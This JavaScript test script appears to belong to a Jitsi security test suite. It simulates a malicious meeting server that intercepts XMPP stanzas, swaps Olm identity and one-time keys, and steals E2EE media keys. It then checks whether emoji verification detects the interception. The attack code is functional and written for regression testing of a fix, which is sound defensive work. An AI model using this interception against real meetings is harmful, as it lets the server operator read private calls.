// Man-in-the-middle attack on Jitsi's E2EE key exchange, run by a malicious server.
//
// "Mallory" sits where the meeting server sits: on each browser's XMPP WebSocket
// (Playwright routeWebSocket), able to read and rewrite every stanza, exactly what
// whoever runs Prosody can do. Mallory runs real Olm (same library as the browsers)
// and has her own identity key. Attacks:
//
//   swap            Replace the identity/one-time key in session-init with Mallory's,
//                   so each browser builds its Olm session with Mallory. Mallory
//                   decrypts every media key and re-encrypts it for the other side.
//                   Presence (the published identity keys) is left untouched.
//   swap-presence   Same, and also replace the initiator's published Curve25519 key,
//                   as seen by the responder, with Mallory's (only that direction).
//   swap-full       Same, and replace every published Curve25519 key both ways, so
//                   everything a browser can see is consistent with Mallory's key.
//   swap-all        Same, and also replace every published Ed25519 key with Mallory's
//                   and sign the swapped keys with it. This targets the fix, which
//                   signs the Curve25519 keys with the sender's Ed25519 key, so it
//                   is the strongest attack a server can mount.
//
// The emoji (SAS) messages are passed through untouched. After E2EE is on, the test
// runs the emoji verification as two users would, and checks:
//   - whether both browsers show the same emoji and report the other as verified,
//   - whether the honest call keeps decoding video (WebRTC stats),
//   - whether Mallory's stolen keys decrypt the media the server relays,
//   - what the Inspector's capture comparison says.
//
//   node olm-mitm.mjs [--url <meeting URL without jwt>] \
//       --attack none|swap|swap-presence|swap-full|swap-all [--client current|old --lib <dir>]
//
// --client current   test the library the meeting already serves (the build under test).
// --client old --lib <dir>
//                    serve a rebuilt, pre-fix library from <dir> (holding
//                    lib-jitsi-meet.min.js and lib-jitsi-meet.e2ee-worker.js), to
//                    show the same attack succeeding against vulnerable code.
// --answer no        Alice answers "They do not match" even if the emoji match
//                    (to check the warning the UI shows for that answer).

import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { chromium } from 'playwright-core';
import { compareCaptures } from '../../extension/inspector/compare.js';
import { createDecryptor, fingerprint } from '../../extension/inspector/frame-crypto.js';
import { joinMeeting, leaveMeeting, meetingTarget, waitInPage } from '../harness/meeting.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const require = createRequire(import.meta.url);
const Olm = require('@matrix-org/olm/olm.js');
const argv = process.argv.slice(2);
const headed = argv.includes('--headed');
const slowMo = argv.includes('--slowmo') ? Number(argv[argv.indexOf('--slowmo') + 1]) : 0;
const attack = argv.includes('--attack') ? argv[argv.indexOf('--attack') + 1] : 'swap';
const client = argv.includes('--client') ? argv[argv.indexOf('--client') + 1] : 'current';
const libDir = argv.includes('--lib') ? argv[argv.indexOf('--lib') + 1] : null;
const answerNo = argv.includes('--answer') && argv[argv.indexOf('--answer') + 1] === 'no';
const sleep = ms => new Promise(r => setTimeout(r, ms));
const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);

if (![ 'none', 'swap', 'swap-presence', 'swap-full', 'swap-all' ].includes(attack)
        || ![ 'current', 'old' ].includes(client) || (client === 'old' && !libDir)) {
    console.error('usage: node olm-mitm.mjs [--url <meeting URL without jwt>] '
        + '--attack none|swap|swap-presence|swap-full|swap-all [--client current|old --lib <dir>]');
    process.exit(2);
}
setTimeout(() => {
    console.error('run exceeded 4 minutes, aborting');
    process.exit(1);
}, 240000).unref();

// ---- Mallory -----------------------------------------------------------------

await Olm.init();

// After Olm.init(), which installs its own crash handlers: these redact the JWT.
const target = meetingTarget(argv, 'mitm');
const room = target.room;
const account = new Olm.Account();

account.create();
const { curve25519: malloryKey, ed25519: malloryEd25519 } = JSON.parse(account.identity_keys());

// `${victim}>${peer}`: Mallory's Olm session with victim, in which she plays peer.
const sessions = new Map();
const pendingInits = new Map();
const stolen = [];
const actions = [];

const unescapeXml = s => s.replace(/&(quot|apos|lt|gt|amp);/g,
    (_, e) => ({ quot: '"', apos: '\'', lt: '<', gt: '>', amp: '&' })[e]);
const escapeXml = s => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
const senderOf = stanza => stanza.match(/\sfrom=['"][^'"]*\/([^'"/]+)['"]/)?.[1];

function steal(from, plaintext) {
    const info = JSON.parse(plaintext);

    if (info.key) {
        stolen.push({ t: 0, participantId: from, keyIndex: info.keyIndex,
            key: [ ...Buffer.from(info.key, 'base64') ] });
        actions.push(`read media key #${info.keyIndex} of ${from}`);
    }
}

// Rewrites one stanza the server is about to deliver to participant `to`.
function mallory(stanza, to) {
    if (attack === 'none' || !to) {
        return stanza;
    }
    const from = senderOf(stanza);

    if (stanza.startsWith('<presence') && from && from !== to
            && ([ 'swap-full', 'swap-all' ].includes(attack) || (attack === 'swap-presence' && from < to))) {
        const swapped = stanza.replace(/(<jitsi_participant_e2ee\.idKey\.curve25519>)[^<]*/, (_, tag) => {
            actions.push(`showed ${to} Mallory's identity key as ${from}'s`);

            return tag + malloryKey;
        });

        return attack === 'swap-all'
            ? swapped.replace(/(<jitsi_participant_e2ee\.idKey\.ed25519>)[^<]*/, (_, tag) => tag + malloryEd25519)
            : swapped;
    }
    const m = stanza.match(/(<json-message[^>]*>)([^<]*)(<\/json-message>)/);

    if (!m || !from) {
        return stanza;
    }
    const payload = JSON.parse(unescapeXml(m[2]));
    const msg = payload.olm;

    if (payload.type !== 'olm' || !msg) {
        return stanza;
    }
    try {
        if (msg.type === 'session-init') {
            pendingInits.set(msg.data.uuid, { from, idKey: msg.data.idKey, otKey: msg.data.otKey });
            account.generate_one_time_keys(1);
            msg.data.otKey = Object.values(JSON.parse(account.one_time_keys()).curve25519)[0];
            account.mark_keys_as_published();
            msg.data.idKey = malloryKey;
            if (attack === 'swap-all') {
                msg.data.signature = account.sign(JSON.stringify({ idKey: malloryKey, otKey: msg.data.otKey }));
            }
            actions.push(`swapped ${from}'s session-init to ${to} for Mallory's keys`);
        } else if (msg.type === 'session-ack' && pendingInits.has(msg.data.uuid)) {
            const init = pendingInits.get(msg.data.uuid);
            const withSender = new Olm.Session();
            const withRecipient = new Olm.Session();

            withSender.create_inbound(account, msg.data.ciphertext.body);
            account.remove_one_time_keys(withSender);
            const plaintext = withSender.decrypt(msg.data.ciphertext.type, msg.data.ciphertext.body);

            withRecipient.create_outbound(account, init.idKey, init.otKey);
            sessions.set(`${from}>${to}`, withSender);
            sessions.set(`${to}>${from}`, withRecipient);
            steal(from, plaintext);
            msg.data.ciphertext = withRecipient.encrypt(plaintext);

            // Upstream's fix sends the responder's identity key, signed, in the ack.
            if (msg.data.idKey) {
                msg.data.idKey = malloryKey;
                if (attack === 'swap-all') {
                    msg.data.signature = account.sign(JSON.stringify({ idKey: malloryKey }));
                }
            }
            actions.push(`answered ${to}'s session-init as ${from}`);
        } else if (msg.data?.ciphertext && sessions.has(`${from}>${to}`)) {
            const plaintext = sessions.get(`${from}>${to}`).decrypt(msg.data.ciphertext.type, msg.data.ciphertext.body);

            steal(from, plaintext);
            msg.data.ciphertext = sessions.get(`${to}>${from}`).encrypt(plaintext);
        } else {
            return stanza;
        }
    } catch (e) {
        actions.push(`failed on ${msg.type} from ${from}: ${e.message}`);

        return stanza;
    }

    return stanza.replace(m[0], () => m[1] + escapeXml(JSON.stringify(payload)) + m[3]);
}

// ---- Meeting -----------------------------------------------------------------

// current: use whatever the build under test already serves (nothing is
// replaced), so the run tests the real deployed or rebuilt code. old: serve a
// rebuilt vulnerable library from --lib, to show the same attack succeeding
// against the pre-fix code and so prove the test detects a real break.
const libFiles = client === 'old' ? {
    'lib-jitsi-meet.min.js': fs.readFileSync(path.join(libDir, 'lib-jitsi-meet.min.js'), 'utf8'),
    'lib-jitsi-meet.e2ee-worker.js': fs.readFileSync(path.join(libDir, 'lib-jitsi-meet.e2ee-worker.js'), 'utf8')
} : {};
const browser = await chromium.launch({ channel: 'chrome', headless: !headed, slowMo, args: [
    '--use-fake-ui-for-media-stream',
    '--use-fake-device-for-media-stream',
    `--use-file-for-fake-audio-capture=${path.join(HERE, '../harness/media/tone440.wav')}`,
    '--autoplay-policy=no-user-gesture-required'
] });

async function join(name) {
    const ctx = await browser.newContext({ ignoreHTTPSErrors: true });
    const page = await ctx.newPage();
    let me;

    page.on('console', m => (process.env.VERBOSE
        ? /e2ee|olm/i.test(m.text()) && [ 'warning', 'error', 'info' ].includes(m.type())
        : /session-init from|session-ack from|signature|SAS verification|Identity key|BAD_MESSAGE/.test(m.text()))
        && log(`${name} console: ${m.text().slice(0, 160)}`));
    page.on('pageerror', e => /OLM|BAD_MESSAGE/.test(e.message) && log(`${name} page error: ${e.message.slice(0, 160)}`));
    for (const [ name, body ] of Object.entries(libFiles)) {
        await page.route(new RegExp(`/libs/${name.replace(/\./g, '\\.')}`),
            r => r.fulfill({ body, contentType: 'text/javascript' }));
    }
    await page.routeWebSocket(/xmpp-websocket/, ws => {
        const server = ws.connectToServer();

        ws.onMessage(m => {
            me ??= String(m).match(/^<presence to=['"][^'"]*\/([^'"/]+)['"]/)?.[1];
            server.send(m);
        });
        server.onMessage(m => ws.send(typeof m === 'string' ? mallory(m, me) : m));
    });

    // After routeWebSocket, so the Inspector wraps the socket the page uses and sees
    // the stanzas as delivered (after Mallory), as it would with a real server.
    await page.addInitScript({ path: path.join(HERE, '../../extension/inspector/leak-scan.js') });
    await page.addInitScript({ path: path.join(HERE, '../../extension/inspector/hook.js') });
    const hash = {
        'config.p2p.enabled': false,
        'config.startWithAudioMuted': false,
        'config.startWithVideoMuted': false,
        'config.videoQuality.codecPreferenceOrder': [ 'VP8' ],
        'userInfo.displayName': name
    };

    await joinMeeting(page, target.url(hash), name).catch(async e => {
        await page.screenshot({ path: path.join(HERE, 'results', `join-failed-${name}.png`) });
        throw e;
    });
    await page.evaluate(() => {
        window.__sas = {};
        APP.conference._room.on('conference.e2ee.verification.ready',
            (pId, sas) => (window.__sas.emoji = sas.emoji.map(e => e[1])));
        APP.conference._room.on('conference.e2ee.verification.completed',
            (pId, success, message) => (window.__sas.completed = { success, message: message ?? null }));
    });

    return page;
}

log(`attack: ${attack}, client: ${client} lib-jitsi-meet, room ${room}`);
const alice = await join('alice');
const bob = await join('bob');
const ids = {
    alice: await alice.evaluate(() => APP.conference._room.myUserId()),
    bob: await bob.evaluate(() => APP.conference._room.myUserId())
};

await sleep(3000);
await alice.evaluate(() => APP.store.dispatch({ type: 'TOGGLE_E2EE', enabled: true }));
for (const page of [ alice, bob ]) {
    await waitInPage(page, () => APP.conference._room.isE2EEEnabled(), null, 30000);
}
log('E2EE on in both browsers; media for 15 s');
await sleep(15000);

// The emoji check, as two users would do it: start it, compare, confirm.
await alice.evaluate(id => APP.conference._room.startVerification(id), ids.bob);
await Promise.all([ alice, bob ].map(p => waitInPage(p, () => Boolean(window.__sas.emoji), null, 15000)
    .catch(() => null)));
const emoji = { alice: await alice.evaluate(() => window.__sas.emoji), bob: await bob.evaluate(() => window.__sas.emoji) };
const sameEmoji = Boolean(emoji.alice && emoji.bob && emoji.alice.join() === emoji.bob.join());

log(`emoji  alice: ${emoji.alice?.join(' ')}`);
log(`emoji  bob:   ${emoji.bob?.join(' ')}`);

// Answer through the app, as the dialog's "They match" / "They do not match"
// buttons do, so the app's own handling (notifications, label) runs.
const answer = (page, pId, isVerified) => page.evaluate(([ id, ok ]) =>
    APP.store.dispatch({ type: 'PARTICIPANT_VERIFIED', pId: id, isVerified: ok }), [ pId, isVerified ]);

if (sameEmoji) {
    await answer(alice, ids.bob, !answerNo);
    await answer(bob, ids.alice, true);
}
await Promise.all([ alice, bob ].map(p => waitInPage(p, () => Boolean(window.__sas.completed), null, 10000)
    .catch(() => null)));
const verified = {
    alice: await alice.evaluate(() => window.__sas.completed ?? null),
    bob: await bob.evaluate(() => window.__sas.completed ?? null)
};

await sleep(3000);

// What each user is shown about the verification.
const shown = page => page.evaluate(() => ({
    notifications: APP.store.getState()['features/notifications'].notifications
        .map(n => n.props.descriptionKey ?? n.props.titleKey)
        .filter(k => /^e2ee\.(verif|activat)/.test(k ?? '')),
    label: document.body.innerText.includes('Verification failed') ? 'Verification failed (red)' : null
}));
const ui = { alice: await shown(alice), bob: await shown(bob) };

// Frames each browser actually decoded (after E2EE decryption and video decode),
// measured over 4 s from WebRTC stats. Unlike the Inspector's own decrypt check
// below, this doesn't need the media keys, so it still shows the honest call
// playing even when the key vault hides the keys from the page. A healthy
// encrypted call keeps climbing; a call whose E2EE setup was rejected (swap)
// decodes nothing, because the frames stay encrypted.
const decodedFrames = page => page.evaluate(async () => {
    const pc = APP.conference._room?.jvbJingleSession?.peerconnection?.peerconnection;

    if (!pc) {
        return 0;
    }
    const stats = await pc.getStats();

    return [ ...stats.values() ].filter(s => s.type === 'inbound-rtp' && s.kind === 'video')
        .reduce((n, s) => n + (s.framesDecoded ?? 0), 0);
});
const dec1 = { alice: await decodedFrames(alice), bob: await decodedFrames(bob) };

await sleep(4000);
const playing = {
    alice: await decodedFrames(alice) - dec1.alice,
    bob: await decodedFrames(bob) - dec1.bob
};

// What each browser received, and whether Mallory's keys open it.
async function received(page) {
    const meta = await page.evaluate(() => window.__e2eeInspector.exportMeta());
    const ownKeys = createDecryptor(meta.keys);
    const malloryKeys = createDecryptor(stolen);
    const result = { frames: 0, byReceiver: 0, byMallory: 0 };

    for (const s of meta.streams.filter(st => st.mode === 'e2ee')) {
        const from = Math.max(0, s.frameCount - 300);
        const frames = (await page.evaluate(([ id, a, b ]) => window.__e2eeInspector.exportFrames(id, a, b),
            [ s.id, from, s.frameCount ])).map(f => ({ ...f, data: new Uint8Array(Buffer.from(f.data, 'base64')) }));

        for (const f of frames) {
            result.frames++;
            result.byReceiver += (await ownKeys(s, f)) ? 1 : 0;
            result.byMallory += (await malloryKeys(s, f)) ? 1 : 0;
        }
    }

    return { meta, result };
}
const a = await received(alice);
const b = await received(bob);
const cmp = compareCaptures(a.meta, b.meta);

await Promise.all([ alice, bob ].map(leaveMeeting));
await browser.close();

const report = {
    attack,
    client,
    ids,
    mallory: { identityKey: malloryKey, actions, keysStolen: await Promise.all(stolen.map(async k =>
        ({ participant: k.participantId, keyIndex: k.keyIndex, fingerprint: await fingerprint(Uint8Array.from(k.key)) }))) },
    emoji: { ...emoji, same: sameEmoji },
    verified,
    media: { alice: a.result, bob: b.result },
    decodedFramesIn4s: playing,
    ui,
    inspectorCompare: {
        noInterception: cmp.noInterception,
        aliceToBob: { identity: cmp.aToB.identity.status, sessionInit: cmp.aToB.sessionInit.status },
        bobToAlice: { identity: cmp.bToA.identity.status, sessionInit: cmp.bToA.sessionInit.status }
    }
};
const file = path.join(HERE, 'results', `${attack}-${report.client}-${Date.now()}.json`);

fs.mkdirSync(path.dirname(file), { recursive: true });
fs.writeFileSync(file, JSON.stringify(report, null, 2));

const pct = r => (r.frames ? `${r.byMallory}/${r.frames}` : 'no encrypted frames');

console.log(`
Mallory actions:        ${[ ...new Set(actions) ].join('; ') || 'none'}
Media keys stolen:      ${stolen.length}
Emoji match:            ${sameEmoji ? 'yes' : 'NO'}
Verified (alice, bob):  ${verified.alice?.success ?? '-'} ${verified.alice?.message ?? ''}, ${
    verified.bob?.success ?? '-'} ${verified.bob?.message ?? ''}
Honest call plays:      alice +${playing.alice} frames/4s, bob +${playing.bob} frames/4s
Inspector decrypt:      alice ${a.result.byReceiver}/${a.result.frames}, bob ${b.result.byReceiver}/${b.result.frames} (0 when the key vault hides keys from the page)
Mallory decrypts:       to alice ${pct(a.result)}, to bob ${pct(b.result)}
UI alice:               ${JSON.stringify(ui.alice)}
UI bob:                 ${JSON.stringify(ui.bob)}
Inspector compare:      ${cmp.noInterception ? 'no interception' : 'INTERCEPTION DETECTED'} (identity ${
    cmp.aToB.identity.status}/${cmp.bToA.identity.status}, session-init ${cmp.aToB.sessionInit.status}/${cmp.bToA.sessionInit.status})
report: ${file}`);

// The security invariant: a server must never BOTH read the media AND pass
// verification. It breaks only if Mallory stole a media key and both users
// still saw the other as verified. A secure build satisfies it for every
// attack (keys rejected, or stolen but verification fails); a pre-fix build
// fails it on the key-swap attacks, which is how this test detects a real break.
const brokenSilently = stolen.length > 0 && verified.alice?.success === true && verified.bob?.success === true;

console.log(brokenSilently
    ? '\nVERDICT: INSECURE — the server read the media and verification still passed.'
    : '\nVERDICT: secure — the server could not both read the media and pass verification.');
process.exit(brokenSilently ? 1 : 0);
